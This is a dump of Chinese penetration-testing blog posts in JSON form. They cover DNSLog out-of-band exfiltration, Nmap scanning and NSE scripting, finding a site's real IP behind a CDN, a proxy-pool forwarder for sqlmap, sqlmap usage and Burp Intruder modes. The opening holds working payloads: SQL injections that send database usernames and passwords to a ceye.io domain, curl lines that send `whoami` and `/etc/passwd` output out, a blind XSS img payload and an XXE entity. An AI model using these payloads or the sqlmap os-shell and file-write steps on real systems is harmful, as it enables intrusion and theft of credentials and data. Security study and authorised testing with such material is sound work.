database()),&#39;.4do468.ceye.io\\\\abc&#39;))),1,0)%23hex转码http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\\\\\&#39;,(select hex(user())),&#39;.4do468.ceye.io\\\\abc&#39;))),1,0)%23取数据http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\\\\\&#39;,(select hex(concat(username,0x7e,password,0x7e)) from security.users limit 0,1),&#39;.4do468.ceye.io\\\\abc&#39;))),1,0)%23 命令执行 Windows下 查看计算机名，其他类似 1ping %COMPUTERNAME%.xxx.ceye.io Linux下 查看当前用户和passwd文件，其他类似 12curl http:&#x2F;&#x2F;ip.port.xxx.ceye.io&#x2F;&#96;whoami&#96;curl http:&#x2F;&#x2F;ip.port.xxoo.ceye.io&#x2F;&#96;cat &#x2F;etc&#x2F;passwd&#96; XSS 通过盲打，让触发者浏览器访问预设至的链接地址，如果盲打成功，会在平台上收到如下的链接访问记录： 1payload:&gt;&lt;img src&#x3D;http:&#x2F;&#x2F;xss.xxxx.ceye.io&#x2F;aaa&gt; SSRF payload: 12345&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;ip.port.xxx.ceye.io&#x2F;aa&quot;&gt;%remote;]&gt;&lt;root&#x2F;&gt; 0x04 总结 有些函数的使用具有操作系统的限制。 DNS查询有长度限制，所以必要的时候需要对查询结果做字符串的切割。 避免一些特殊符号的产生，最好的选择就是数据先编码再带出。 注意不同数据库的语法是有差异的，特别是在数据库拼接的时候。 有些操作是需要较高的权限。 🌈🌈 利用DNSLog攻击的方法，能更加简便、高效的进行渗透测试，并且拥有足够权限，可以直接拿下目标站点。","categories":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"技巧","slug":"技巧","permalink":"http://yoursite.com/tags/%E6%8A%80%E5%B7%A7/"}]},{"title":"NMAP的使用","slug":"Nmap使用","date":"2020-06-27T06:53:22.000Z","updated":"2020-06-27T06:53:22.000Z","comments":true,"path":"2020/06/27/Nmap使用/","link":"","permalink":"http://yoursite.com/2020/06/27/Nmap%E4%BD%BF%E7%94%A8/","excerpt":"","text":"namp端口状态 123456Open(开放的): 应用程序正在这个端口上监听连接。losed(关闭的): 端口对探测做出了响应，但是现在没有应用程序在监听这个端口。Filtered(过滤的): 端口没有对探测做出响应。同时告诉我们探针可能被一些过滤器（防火墙）终止了。Unfiltered(未被过滤的):端口对探测做出了响应，但是Nmap无法确定它们是关闭还是开放。Open/Filtered: 端口被过滤或者是开放的，Nmap无法做出判断。Closed/Filtered: 端口被过滤或者是关闭的，Nmap无法做出判断。 TCP标志位 123456SYN(synchronous建立联机)ACK(acknowledgement 确认)PSH(push传送)FIN(finish结束)RST(reset重置)URG(urgent紧急) nmap常用命令 轻量级扫描： 1234567nmap -sP 192.168.0.0/24 判断哪些主机存活nmap -sT 192.168.0.3 开放了哪些端口nmap -sS 192.168.0.127 开放了哪些端口（隐蔽扫描）nmap -sU 192.168.0.127 开放了哪些端口（UDP）nmap -sS -O 192.168.0.127 操作系统识别nmap -sT -p 80 -oG – 192.168.1.* | grep open列出开放了指定端口的主机列表nmap -sV -p 80 thief.one 列出服务器类型(列出操作系统，开发端口，服务器类型,网站脚本类型等) 批量扫描： 123nmap -sT -sV -O -P0 --open -n -oN result.txt -p80-89,8080-8099,8000-8009,7001-7009,9000-9099,21,443,873,2601,2604,3128,4440,6082,6379,8888,3389,9200,11211,27017,28017,389,8443,4848,8649,995,9440,9871,2222,2082,3311,18100,9956,1433,3306,1900,49705,50030,7778,5432,7080,5900,50070,5000,5560,10000 -iL ip.txtnmap -sT -sV -p80-89,8080-8099,8000-8009,7001-7009,9000-9099,21,443,873,2601,2604,3128,4440,6082,6379,8888,3389,9200,11211,27017,28017,389,8443,4848,8649,995,9440,9871,2222,2082,3311,18100,9956,1433,3306,1900,49705,50030,7778,5432,7080,5900,50070,5000,5560,10000 --open --max-hostgroup 10 --max-parallelism 10 --max-rtt-timeout 1000ms --host-timeout 800s --max-scan-delay 2000ms -iL ~/Desktop/ip.txt -oN ~/Desktop/result/result.txt nmap参数 1234567891011121314151617181920212223242526272829303132333435nmap [Scan Type(s)] [Options] &#123;target specification&#125;scan type(s) 用于指定扫描类型options 用于指定选项target specification 用于指定扫描目标-s 指定扫描类型如下：-sP (ping扫描) *存活主机探测-sS (TCP SYN扫描 隐身扫描) *默认扫描方式，使用频率最高的半开放扫描-sT (tcp 扫描) *TCP connect()默认的扫描方式，完成三次握手-sU （UDP 扫描）用来探测目的的UDP端口，不需要发送任何的SYN包，发送UDP数据包到目的主机等待响应-sA （ACK扫描） *三次握手 用于探测出防火墙过滤端口 实际渗透中没多大用-sV （版本探测）-A 综合扫描（系统探测，版本探测，路由追踪以及一些常用脚本的扫描）-O （启用操作系统检测）-v详细选项说明-P0 [指定端口] (无ping扫描)-PU [指定端口] (udp ping扫描)-PS [指定端口] (TCP SYN ping 扫描)-PA [指定端口] (tcp ack ping扫描)-PI 使用真正的pingICMP echo请求来扫描目标主机是否正在运行-iL 指定扫描主机列表-iR 随机选择目标–exclude 排除扫描目标–excludefile 排除文件中目标列表-n (不用域名解析)-R (为所有目标解析域名)-T 时间优化（每隔多久发一次包 ） -T5 最快 -T0 最慢（5适合局域网）-F 快速扫描-e 指定网络接口-M 设置tcp扫描线程-iL 文件 指定一个文本内的所有主机nmap的输出：oN，oX，oS，oG（结果为一般模式。XML，kiddi3，grepable格式）nmap输出 ip：port 格式：nmap -vv -p 80 192.168.1.0/24 | grep “Discovered open port” | awk &#123;‘print $6”:”$4’&#125; | awk -F/ &#123;‘print $1’&#125; &gt; output.txt","categories":[{"name":"工具","slug":"工具","permalink":"http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"NMAP","slug":"NMAP","permalink":"http://yoursite.com/tags/NMAP/"}]},{"title":"NSE编写","slug":"NSE编写","date":"2020-06-27T06:52:11.000Z","updated":"2020-06-27T06:52:11.000Z","comments":true,"path":"2020/06/27/NSE编写/","link":"","permalink":"http://yoursite.com/2020/06/27/NSE%E7%BC%96%E5%86%99/","excerpt":"","text":"NSE简介 Nmap 一款标志性的跨平台扫描器。它的原意为Network Mapper（网络映射器），具有相当强大的扫描功能。Nmap还可根据NSE (Nmap scripting Engine)的脚本进行大量渗透工作，这种脚本是基于Lua编程语言。正是NSE，使得Nmap不再普通。 Nmap的目录结构 Linux Windows 主要关注两个目录： neslib存放着各种库文件 script存放着NSE脚本 nmap脚本和库文件手册：https://nmap.org/nsedoc/ NSE中的库文件 NSE中的库文件实现了代码的分离和重构，有助于脚本的开发，其存放在nselib文件夹中。 库文件的编写 创建一个库文件保存为demo.lua，用于对于传入的参数 返回 这个端口 是开启的。 123function Test( port ) return string.format(&quot;The port &#39;%s&#39; is open&quot;,port)end 在脚本文件中引入这个库文件，引入库文件的格式一般为 local 库文件名 = require “库文件名” 业界人士称，在lua中，如果是一些经常用到的全局函数，可以申明为local局部变量，这样做可以提升效率。 在脚本中使用此库文件中的函数。 123456789101112local shortport &#x3D; require &quot;shortport&quot;local demo &#x3D; require &quot;demo&quot;description &#x3D; [[neslib demo test]]categories &#x3D; &#123;&quot;default&quot;&#125;portrule &#x3D; function(host,port) return port.protocol &#x3D;&#x3D; &quot;tcp&quot; and port.number &#x3D;&#x3D; 30081 and port.state &#x3D;&#x3D;&quot;open&quot;endaction &#x3D; function(host, port) return Test(port.number)end NSE编写规则 NSE脚本编写流程 大致分为四步： 导入脚本所需库 脚本描述信息及分类 rule类型：脚本的触发规则 action：脚本具体执行内容，rule触发规则为真时执行action定义的函数 Rule四种类型 Rule：用于描述脚本的触发规则，返回值只有true和false两种。返回值决定了后面action对应的函数是否执行，注意：true(执行),flase(不执行)。它有四种类型分别是 prerule()：不接收参数，脚本只运行一次，在主机发现之前，发生在预扫描阶段。返回的值永远为真。 hostrule(host)：设定参数为目标的ip地址或主机名，nmap完成了主机发现之后再运行脚本。 portrule(host,port)：设定参数需要主机以及端口。在端口扫描时，每个端口运行一次，处于open，open|filtered，或者unfiltered状态的所有端口。 postrule()：不接收参数，nmap完成所有主机已经被扫描后，在脚本的后扫描阶段。返回的值永远为真。 举个例子： 在扫描之前触发脚本，打印I Love China. 12345678910111213description = [[test]]author = &quot;Edsion&quot;license = &quot;Same as Nmap‐‐See http://nmap.org/book/man‐legal.html&quot;categories = &#123;&quot;default&quot;,&quot;safe&quot;&#125;prerule = function(host,port)return trueendaction = function(host, port)return &quot;I Love China.&quot;end 调试模式 在测试阶段我们难免会出现错误,那假设我们出现了错误我们应该如何解决呢。这时我们需要借助Nmap的调试模式进行调试，只需要加上-d选项即可进入调试模式，那一般选择-d 3，3代表的是等级，等级越高，越详细。 nmap API nmap中API的核心功能就是向脚本提供主机和端口的信息。 两个lua table类型的参数：host table 、 port table host table类型 host.os 操作系统信息 host.ip tagret(目标主机)对应的ip,例如下面的127.0.0.1 host.name tagert在命令行对应的名字，例如下面的zzcms.im host.targetname 同上host.name，我个人是这样认为的 host.directly_connected 判断目标主机是否与本机在同一个子网 host.mac_addr mac地址 （必须是同一子网的设备这个命令才有效） port table类型 port.number 端口号 port.protocol 协议 port.service 服务 http或https port.version 版本信息 port.state 端口状态 http库参数扩展 http 库 get() 发起get请求，请求结果以一个table的形式返回 host 要请求的主机 path 要检索的路径 options 可选，允许调用者控制socket,请求头的table port 要检索的端口 post() 发起post请求，请求结果以一个table的形式返回 ignored 向后兼用，一般填写nil，忽略即可 postdata post数据，字符串或者table格式 host 要请求的主机 path 要检索的路径 options 可选，允许调用者控制socket,请求头,超时时间的table port 要检索的端口 NSE脚本分类 脚本类别 描述 auth 与用户认证相关的NSE脚本 broadcast 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务 brute 暴力破解 default 默认，执行脚本（-A或者-sC） discovery 与主机和服务发现相关的脚本 dos 与拒绝服务攻击有关的脚本 exploit 利用已知的漏洞入侵系统 external 利用第三方的数据库或资源，例如进行whois解析 fuzzer 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽 malware 探测目标机是否感染了病毒、开启了后门等信息 safe 此类与intrusive相反，属于安全性脚本 vuln 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067 version 负责增强服务与版本扫描（Version Detection）功能的脚本 NSE脚本使用 123456789101112131415161718192021直接加脚本名称nmap --script http-title &lt;target&gt;nmap --script http-title，http-methods &lt;target&gt;类别nmap --script exploit &lt;target&gt;您也可以用逗号分隔它们来运行多个类别：nmap --script discovery,intrusive &lt;target&gt;路径或文件名（文件夹）nmap --script /path/to/script.nse &lt;target&gt;nmap --script /path/to/script.nse,/another/path/script2.nse &lt;target&gt;表达式nmap -sV --script &quot;not exploit&quot; &lt;target&gt;nmap --script &quot;not（intrusive or dos or exploit）&quot; -sV &lt;target&gt;通配符nmap --script &quot;snmp- *&quot; &lt;target&gt;为脚本提供参数 --script-args=x=x,y=y","categories":[{"name":"工具","slug":"工具","permalink":"http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"NMAP","slug":"NMAP","permalink":"http://yoursite.com/tags/NMAP/"}]},{"title":"绕过CDN寻找真实IP","slug":"绕过CDN","date":"2020-06-23T04:17:11.000Z","updated":"2020-06-23T04:17:11.000Z","comments":true,"path":"2020/06/23/绕过CDN/","link":"","permalink":"http://yoursite.com/2020/06/23/%E7%BB%95%E8%BF%87CDN/","excerpt":"","text":"目前很多站点出于用户体验和安全的角度，使用CDN加速，将域名解析到CDN，这时候就需要绕过CDN来查找真实IP。 一、DNS历史解析记录 查询域名的历史解析记录，找网站使用CDN前的解析记录，从而获取真实ip，相关查询的网站有： 123456iphistory：https://viewdns.info/iphistory/DNS查询：（https://dnsdb.io/zh-cn/）微步在线：（https://x.threatbook.cn/）域名查询：（https://site.ip138.com/）DNS历史查询：（https://securitytrails.com/）Netcraft：https://sitereport.netcraft.com/?url=github.com 二、子域名 很多时候，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。 常用的子域名查找方法和工具： 搜索引擎查询：如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。 在线查询网站： 12345http:&#x2F;&#x2F;tool.chinaz.com&#x2F;subdomain&#x2F;http:&#x2F;&#x2F;i.links.cn&#x2F;subdomain&#x2F; http:&#x2F;&#x2F;subdomain.chaxun.la&#x2F;http:&#x2F;&#x2F;searchdns.netcraft.com&#x2F;https:&#x2F;&#x2F;www.virustotal.com&#x2F; 子域名爆破工具 1234Layer子域名挖掘机wydomain：https:&#x2F;&#x2F;github.com&#x2F;ring04h&#x2F;wydomain subDomainsBrute:https:&#x2F;&#x2F;github.com&#x2F;lijiejie&#x2F;Sublist3r:https:&#x2F;&#x2F;github.com&#x2F;aboul3la&#x2F;Sublist3r 三、网站邮件头信息 比如：邮箱注册，邮箱找回密码、RSS邮件订阅等功能场景，通过网站给自己发送邮件，从而让目标主动暴露他们的真实的IP，查看邮件头信息，获取到网站的真实IP。 四、网络空间安全引擎搜索 通过关键字或网站域名，就可以找出被收录的IP，很多时候获取到的就是网站的真实IP。 123钟馗之眼：https:&#x2F;&#x2F;www.zoomeye.orgShodan：https:&#x2F;&#x2F;www.shodan.ioFofa：https:&#x2F;&#x2F;fofa.so 五、利用SSL证书 证书颁发机构(CA)必须将他们发布的每个SSL/TLS证书发布到公共日志中，SSL/TLS证书通常包含域名、子域名和电子邮件地址。因此SSL/TLS证书成为了攻击者的切入点。 SSL证书搜索引擎： 1https:&#x2F;&#x2F;censys.io&#x2F;ipv4?q&#x3D;github.com 六、国外主机解析域名 大部分 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的DNS查询，很可能获取到真实IP。 国外多PING测试工具： 1234https:&#x2F;&#x2F;asm.ca.com&#x2F;zh_cn&#x2F;ping.phphttp:&#x2F;&#x2F;host-tracker.com&#x2F;http:&#x2F;&#x2F;www.webpagetest.org&#x2F;https:&#x2F;&#x2F;dnscheck.pingdom.com&#x2F; 七、全网扫描 通过Zmap、masscan等工具对整个互联网发起扫描，针对扫描结果进行关键字查找，获取网站真实IP。 ZMap号称是最快的互联网扫描工具，能够在45分钟扫遍全网。 1https:&#x2F;&#x2F;github.com&#x2F;zmap&#x2F;zmap Masscan号称是最快的互联网端口扫描器，最快可以在六分钟内扫遍互联网。 1https:&#x2F;&#x2F;github.com&#x2F;robertdavidgraham&#x2F;masscan 八、配置不当导致绕过 在配置CDN的时候，需要指定域名、端口等信息，有时候小小的配置细节就容易导致CDN防护被绕过。 案例1：为了方便用户访问，我们常常将www.test.com 和 test.com 解析到同一个站点，而CDN只配置了www.test.com，通过访问test.com，就可以绕过 CDN 了。 案例2：站点同时支持http和https访问，CDN只配置 https协议，那么这时访问http就可以轻易绕过。","categories":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"技巧","slug":"技巧","permalink":"http://yoursite.com/tags/%E6%8A%80%E5%B7%A7/"}]},{"title":"SqlMap代理池","slug":"代理池","date":"2020-06-22T07:16:21.000Z","updated":"2020-06-22T07:16:21.000Z","comments":true,"path":"2020/06/22/代理池/","link":"","permalink":"http://yoursite.com/2020/06/22/%E4%BB%A3%E7%90%86%E6%B1%A0/","excerpt":"","text":"获取代理池 获取代理池使用了GIthub上的项目：https://github.com/jhao104/proxy_pool ，并利用REDIS存储获取到的代理地址 启动项目 在cli目录下通过ProxyPool.py启动 12345# 首先启动调度程序&gt;&gt;&gt;python proxyPool.py schedule# 然后启动webApi服务&gt;&gt;&gt;python proxyPool.py webserver Api 启动过几分钟后就能看到抓取到的代理IP，可以直接到数据库中查看，也可以通过api访问http://127.0.0.1:5010 查看。 api method Description arg / GET api介绍 None /get GET 随机获取一个代理 None /get_all GET 获取所有代理 None /get_status GET 查看代理数量 None /delete GET 删除代理 proxy=host:ip 保存代理 自己编写了个小脚本将ProxyPool.py获取到的代理保存在ips.txt中 get_proxy.py： 1234567891011121314151617import requestsdef get_proxy(): return requests.get(&quot;http:&#x2F;&#x2F;127.0.0.1:5010&#x2F;get_all&#x2F;&quot;).json()def delete_proxy(proxy): requests.get(&quot;http:&#x2F;&#x2F;127.0.0.1:5010&#x2F;delete&#x2F;?proxy&#x3D;&#123;&#125;&quot;.format(proxy))res &#x3D; requests.get(&quot;http:&#x2F;&#x2F;127.0.0.1:5010&#x2F;get_status&quot;).json()count &#x3D; res.get(&quot;useful_proxy&quot;)print(&quot;目前代理池中共计：%s个代理.&quot; % count)f &#x3D; open(&quot;ips.txt&quot;, &quot;w&quot;)for i in range(count): b &#x3D; get_proxy()[i][&quot;proxy&quot;]f.write(b + &quot;\\n&quot;)f.close() 本地代理转发 借用前人的成果，实现的效果是启用本地127.0.0.1:9999服务，将ips.txt内的代理转发给本地客户端 ips.py： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144#!/usr/bin/env python# -*- coding: utf-8 -*-import socketfrom socket import errorimport threadingimport randomimport timelocaltime = time.asctime(time.localtime(time.time()))class ProxyServerTest: def __init__(self, proxyip): # 本地socket服务 self.ser = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.proxyip = proxyip def run(self): try: # 本地服务IP和端口 self.ser.bind((&#x27;127.0.0.1&#x27;, 9999)) # 最大连接数 self.ser.listen(5) except error as e: print(&quot;[-]The local service : &quot; + str(e)) return &quot;[-]The local service : &quot; + str(e) while True: try: # 接收客户端数据 client, addr = self.ser.accept() print(&#x27;[*]accept %s connect&#x27; % (addr,)) data = client.recv(1024) if not data: break print(&#x27;[*&#x27; + localtime + &#x27;]: Accept data...&#x27;) except error as e: print(&quot;[-]Local receiving client : &quot; + str(e)) return &quot;[-]Local receiving client : &quot; + str(e) while True: # 目标代理服务器，将客户端接收数据转发给代理服务器 mbsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) iplen = len(self.proxyip) proxyip = self.proxyip[random.randint(0, iplen - 1)] print(&quot;[!]Now proxy ip:&quot; + str(proxyip)) prip = proxyip[0] prpo = proxyip[1 try: mbsocket.settimeout(3) mbsocket.connect((prip, prpo)) except: print(&quot;[-]RE_Connect...&quot;) continue break # except : # print(&quot;[-]Connect failed,change proxy ip now...&quot;) # pass try: mbsocket.send(data) except error as e: print(&quot;[-]Sent to the proxy server : &quot; + str(e)) return &quot;[-]Sent to the proxy server : &quot; + str(e) while True: try: # 从代理服务器接收数据，然后转发回客户端 data_1 = mbsocket.recv(1024) if not data_1: break print(&#x27;[*&#x27; + localtime + &#x27;]: Send data...&#x27;) client.send(data_1) except socket.timeout as e: print(proxyip) print(&quot;[-]Back to the client : &quot; + str(e)) continue # 关闭连接 client.close() mbsocket.close()def Loadips(): print(&quot;[*]Loading proxy ips..&quot;) ip_list = [] ip = [&#x27;ip&#x27;, &#x27;port&#x27;] with open(&quot;ips.txt&quot;) as ips: lines = ips.readlines() for line in lines: ip[0], ip[1] = line.strip().split(&quot;:&quot;) ip[1] = eval(ip[1]) nip = tuple(ip) ip_list.append(nip) return ip_listdef main(): print(&#x27;&#x27;&#x27;*Atuhor : V@1n3R.*Blog :http://www.Lz1y.cn*date: 2017.7.17*http://www.Lz1y.cn/wordpress/?p=643 __ __ _ _____ ____ \\ \\ / /_ _/ |_ __ |___ /| _ \\ \\ \\ / / _` | | &#x27;_ \\ |_ \\| |_) | \\ V / (_| | | | | |___) | _ &lt; _ \\_/ \\__,_|_|_| |_|____/|_| \\_(_) &#x27;&#x27;&#x27;) ip_list = Loadips() # ip_list = [(&#x27;118.89.148.92&#x27;,8088)] # ip_list = tuple(ip_list) try: pst = ProxyServerTest(ip_list) # 多线程 t = threading.Thread(target=pst.run, name=&#x27;LoopThread&#x27;) print(&#x27;[*]Waiting for connection...&#x27;) # 关闭多线程 t.start() t.join() except Exception as e: print(&quot;[-]main : &quot; + str(e)) return &quot;[-]main : &quot; + str(e)if __name__ == &#x27;__main__&#x27;: main() SqlMap使用代理池 sqlmap加上代理 “–proxy=http://127.0.0.1:9999” 即可使用 使用之前建议先检测一下代理的有效性：http://h.jiguangdaili.com/check/","categories":[{"name":"工具","slug":"工具","permalink":"http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"Sqlmap","slug":"Sqlmap","permalink":"http://yoursite.com/tags/Sqlmap/"}]},{"title":"SqlMap总结","slug":"SqlMap总结","date":"2020-06-22T03:29:58.000Z","updated":"2020-06-22T03:29:58.000Z","comments":true,"path":"2020/06/22/SqlMap总结/","link":"","permalink":"http://yoursite.com/2020/06/22/SqlMap%E6%80%BB%E7%BB%93/","excerpt":"","text":"SqlMap测试基本流程 sqlmap -u “url” sqlmap -u URL –dbs sqlmap -u URL -D database –tables sqlmap -u URL -D database -T tablename –columns sqlmap -u URL -D database -T tablename -C columnsname –dump SqlMap常用命令 123456789101112131415161718192021222324--is-dba 当前用户权限（是否为root权限，mssql下最高权限为sa）-–batch 默认选项运行--dbs 所有数据库--current-db 网站当前数据库--users 所有数据库用户--current-user 当前数据库用户--random-agent 构造随机user-agent–dbms 指定后端数据库,给定后端数据库的类型可以减少减少无关的测试用例--proxy http:&#x2F;&#x2F;local:8080 –threads 10 (可以自定义线程加速) 代理--time-sec&#x3D;TIMESEC DBMS响应的延迟时间（默认为5秒--threads&#x3D; 使用多少线程–fresh-queries fresh-queries会忽略之前的查询结果,进行重新请求操作–flush-session flush-session会清空当前URL相关的session–level 设置检测的方方面面和测试用例 - 默认是1,会尝试POST和GET - 2:Cookie也会加入检测 - 3:User-Agent和Referer也会检测, 更大的值会增加用例量-–technique 指定sqlmap使用的检测技术 B:Boolean-based-blind （布尔型注入） U:Union query-based （联合注入） E:Error-based （报错型注入) S:Starked queries （通过sqlmap读取文件系统、操作系统、注册表必须 使用该参数，可多语句查询注入） T:Time-based blind （基于时间延迟注入） MYSQL新特性secure_file_priv对读写文件的影响 secure-file-priv是在Mysql5.7版本后引入的新特性，secure-file-priv参数是用来限制导入导出传到哪个指定目录 当配置文件内没有secure-file-priv参数，表示限制mysqld 不允许导入|导出 当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制 当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下 解决方法： windows下：修改my.ini 在[mysqld]内加入secure_file_priv = linux下：修改my.cnf 在[mysqld]内加入secure_file_priv = 之后需重启Mysql SqlMap技巧 抓包注入 从bp抓包文件中检测 1sqlmap.py -r &quot;路径&quot; 指定检测参数 -p 参数名 参数后面加上*d 伪静态注入 1.&#x2F;sqlmap.py -u “http:&#x2F;&#x2F;sfl.fzu.edu.cn&#x2F;index.php&#x2F;Index&#x2F;view&#x2F;id&#x2F;40*.html&quot; 需要登陆的注入 利用cookie参数注入，也可以使用抓包注入： 1sqlmap.py -u &quot;http:&#x2F;&#x2F;xxxxxx&#x2F;sqli&#x2F;?id&#x3D;1&amp; Submit&#x3D;Submit&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;q3bm4gupu58dqptm0lve1o12u4; security&#x3D;low&quot; 交互式shell 写文件的两个前提： 获取网站的绝对路径 拥有足够的权限dba/root 首先判断当前是否为dba权限 开始写入shell 1sqlmap.py -r &quot;路径&quot; --os-shell 选择shell脚本类型，接着输入路径，写入成功就进入一个交互式的shell命令行，还会返回一个上传文件的路径，也就是写入了2个shell，一个用来执行命令，另一个用来上传，其中上传shell的文件名为tmpugppx.php，出现admin admin这样的文字，这是sqlmap用来确认是否成功写进shell的标志 文件读写 读文件需要知道路径 1sqlmap.py -u &quot;http:&#x2F;&#x2F;xxxxxx&#x2F;sqli&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;q3bm4gupu58dqptm0lve1o12u4; security&#x3D;low&quot; --file-read&#x3D;&#x2F;opt&#x2F;lampp&#x2F;htdocs&#x2F;php.ini 写文件 1sqlmap.py -u &quot;http:&#x2F;&#x2F;xxxxxx&#x2F;sqli&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;q3bm4gupu58dqptm0lve1o12u4; security&#x3D;low&quot; --file-write C:\\1.txt --file-dest &#x2F;opt&#x2F;lampp&#x2F;htdocs&#x2F;vulnerabilities&#x2F;exec&#x2F;1.txt 表示将本地C:\\\\1.txt 写入到服务器端/opt/lampp/htdocs/vulnerabilities/exec/1.txt 辅助手工注入 两种方式，一种是每执行一次都会使用手工的语句注入一遍，效率比较低，第二种类似于平常命令行执行sql语句 12sqlmap.py -r &quot;路径&quot; --sql-query &quot;sql语句&quot;sqlmap.py -r &quot;路径&quot; --sql-shell SqlMap检测参数 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465--current-user 检索当前用户--current-db 检索当前数据库-is-dba 当前用户权限（是否为root权限）-dbs 所有数据库--users 列出用户列表--passwords 列出用户密码的hash值--os-shell 提示为交互式操作系统shell--os-pwn 提示为OOB外壳，Meterpreter或VNC--batch 永远不要要求用户输入，使用默认行为--sql-shell 提示输入交互式sqlmap shell请求: 这些选项可用于指定如何连接到目标URL --data&#x3D;DATA 数据字符串通过POST发送 --cookie&#x3D;COOKIE HTTP Cookie的值 --random-agent 随机选择 HTTP User-Agent 头的值 --proxy&#x3D;PROXY 使用代理去连接目标URL --tor 使用匿名网络 --check-tor 检查Tor是否正确使用File system access（访问文件系统）：这些选项可以被用来访问后端数据库管理系统的底层文件系统。 –file-read&#x3D;RFILE 从后端的数据库管理系统文件系统读取文件 –file-write&#x3D;WFILE 编辑后端的数据库管理系统文件系统上的本地文件 –file-dest&#x3D;DFILE 后端的数据库管理系统写入文件的绝对路径Optimization（优化）：这些选项可用于优化SqlMap的性能。 -o 开启所有优化开关 –predict-output 预测常见的查询输出 –keep-alive 使用持久的HTTP（S）连接 –null-connection 从没有实际的HTTP响应体中检索页面长度 –threads&#x3D;THREADS 最大的HTTP（S）请求并发量（默认为1）Injection（注入）：这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。 -p TESTPARAMETER 可测试的参数（S） –dbms&#x3D;DBMS 强制后端的DBMS为此值 –os&#x3D;OS 强制后端的DBMS操作系统为这个值 –prefix&#x3D;PREFIX 注入payload字符串前缀 –suffix&#x3D;SUFFIX 注入payload字符串后缀 –tamper&#x3D;TAMPER 使用给定的脚本（S）篡改注入数据Detection（检测）：这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。 –level&#x3D;LEVEL 执行测试的等级（1-5，默认为1） –risk&#x3D;RISK 执行测试的风险（0-3，默认为1） –string&#x3D;STRING 查询时有效时在页面匹配字符串 –regexp&#x3D;REGEXP 查询时有效时在页面匹配正则表达式 –text-only 仅基于在文本内容比较网页Techniques（技巧）：这些选项可用于调整具体的SQL注入测试。 –technique&#x3D;TECH SQL注入技术测试（默认BEUST） –time-sec&#x3D;TIMESEC DBMS响应的延迟时间（默认为5秒） –union-cols&#x3D;UCOLS 定列范围用于测试UNION查询注入 –union-char&#x3D;UCHAR 用于暴力猜解列数的字符Fingerprint（指纹）： -f, –fingerprint 执行检查广泛的DBMS版本指纹Brute force（蛮力）：这些选项可以被用来运行蛮力检查。 –common-tables 检查存在共同表 –common-columns 检查存在共同列","categories":[{"name":"工具","slug":"工具","permalink":"http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"Sqlmap","slug":"Sqlmap","permalink":"http://yoursite.com/tags/Sqlmap/"}]},{"title":"BurpSuite——Intruder四种模式详解","slug":"BurpSuite——Intruder四种模式详解","date":"2020-06-17T14:57:52.000Z","updated":"2020-06-17T14:57:52.000Z","comments":true,"path":"2020/06/17/BurpSuite——Intruder四种模式详解/","link":"","permalink":"http://yoursite.com/2020/06/17/BurpSuite%E2%80%94%E2%80%94Intruder%E5%9B%9B%E7%A7%8D%E6%A8%A1%E5%BC%8F%E8%AF%A6%E8%A7%A3/","excerpt":"","text":"一、Sniper（狙击手） Sniper模式只能使用一组 payload 集合，一次只使用一个 payload 位置；假如标记了两个位置 “A” 和 “B” ，payload 集合内有“1”和“2”两个值，那么它攻击会形成以下组合： 攻击序列 位置A 位置B 1 1 不替换 2 2 不替换 3 不替换 1 4 不替换 2 适用场景：竞争条件测试（选择Null payloads），密码、验证码暴力破解，重放攻击等场景 二、Battering ram（攻城锤） 同样只能使用一组 payload 集合，不同的地方在于每次攻击都是替换所有payload标记位置；如果添加了两个参数的话，就一起进行爆破，两个参数爆破时候的值肯定就是一样的了： 攻击序列 位置A 位置B 1 1 1 2 2 2 适用场景：暴力破解 三、Pitchfork（草叉） 草叉模式允许使用多组payload组合，如果只添加了一个参数的话，会报错；在每个标记位置上遍历各自对应的payload组合，假设有两个位置“A”和“B”，payload组合1的值为“1”和“2”，payload组合2的值为“3”和“4”，那么它攻击会形成以下组合： 攻击序列 位置A 位置B 1 1 3 2 2 4 注：如果两个payload行数不一致的话，取最小值进行测试。所以爆破的次数取两个中最小的为准。 适用场景：恶意注册、撞裤 四、Cluster 